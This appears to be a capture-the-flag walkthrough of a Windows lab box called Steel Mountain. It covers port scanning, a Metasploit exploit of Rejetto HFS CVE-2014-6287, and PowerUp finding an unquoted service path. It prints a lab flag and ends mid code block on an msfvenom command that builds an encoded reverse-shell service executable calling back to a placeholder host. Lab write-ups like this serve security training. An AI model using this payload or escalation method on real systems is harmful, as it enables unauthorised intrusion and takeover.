# **Steel Mountain: Windows Enumeration and Privilege Escalation - A Step-by-Step Guide**

Hey there! In this guide, I'll walk you through how to enumerate a Windows machine, gain initial access, escalate your privileges, and explain why these steps are crucial for penetration testing and red teaming. Think of this as a learning journey through the process of identifying vulnerabilities, gaining access, and escalating your privileges to Administrator. Ready? Let’s dive in!

---

## **Key Steps Overview**:

### 1. **Enumeration**: 
Before you do anything, the first thing you need to do is gather information about the target machine. Think of it as reconnaissance—like surveying the area before launching your attack.
- **Scan for Open Ports**: First, you’ll want to identify which ports are open on the target machine. This helps you spot potential attack vectors.
- **Identify Running Services**: After scanning for open ports, look at what services are running. This could give you a clue about any vulnerabilities present.
- **Look for Weaknesses**: Search for misconfigurations, weak credentials, or other vulnerabilities that might be easy to exploit.

### 2. **Gaining Initial Access**:
Now that you know more about the target system, it’s time to exploit a vulnerability and get your foot in the door.
- **Metasploit**: I’ll show you how to use Metasploit to exploit a known vulnerability (like the one I used in this guide) to establish an initial shell on the machine.

### 3. **Post-Exploitation Enumeration**:
Once you're in, the fun part begins: learning more about the system and its configuration. This can give you valuable information for escalating your privileges.
- **PowerShell Enumeration**: Using PowerShell, we’ll gather information about users, groups, and security settings. This helps us look for possible ways to escalate privileges.

### 4. **Privilege Escalation**:
This is the final goal: getting from a low-privileged user to an **Administrator** (root). I’ll show you how to exploit certain misconfigurations and weak permissions to escalate your privileges.
- **Exploitation**: We’ll focus on unquoted service paths and weak file permissions—two of the most common privilege escalation vectors on Windows.

---

## **Step 1: Gaining Initial Shell on a Windows Machine**

So, let’s talk about how I gained initial access to the Windows machine.

### **What I Found**:
- **Nmap Scan**: The first thing I did was scan the target machine with Nmap. During the scan, I found that the machine was running an additional web server on port 8080.
- **Vulnerabilities**: I dug deeper into the web server and discovered that it was running **Rejetto HTTP File Server**, which has a vulnerability known as **CVE-2014-6287**. This vulnerability allows for Remote Code Execution (RCE).

### **Exploitation**:
- **Metasploit**: I used Metasploit to exploit this vulnerability. It was pretty straightforward to execute the exploit, and once I did, I had a shell on the machine.

### **The Result**:
- After exploiting the vulnerability, I was able to retrieve the flag b04763b6fcf51fcd7c13abc7db4fd365

### **Why This Matters**:
In real-world penetration testing, attackers often target unpatched or known vulnerabilities like CVE-2014-6287 to gain access to a system. By understanding these attack vectors, you can better defend against them.

---

## **Step 2: Privilege Escalation to Administrator**

Now that I have a foothold on the system, the next step is to escalate my privileges. Here’s how I did it.

### **What I Found**:
- **PowerUp**: To find potential privilege escalation vectors, I used **PowerUp**, a tool designed to identify misconfigurations and weaknesses in Windows systems. One thing PowerUp revealed was an **unquoted service path vulnerability** in the **AdvancedSystemCare9** service.

### **Exploiting Weak Permissions**:
- The service had weak permissions, allowing me to write to its directory and replace its executable. I also found that the service had a **CanRestart** option, meaning I could restart it and trigger the execution of the new executable.

- **Creating a Malicious Payload**: Using **msfvenom**, I created a reverse shell payload that would give me access as soon as the service restarted:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
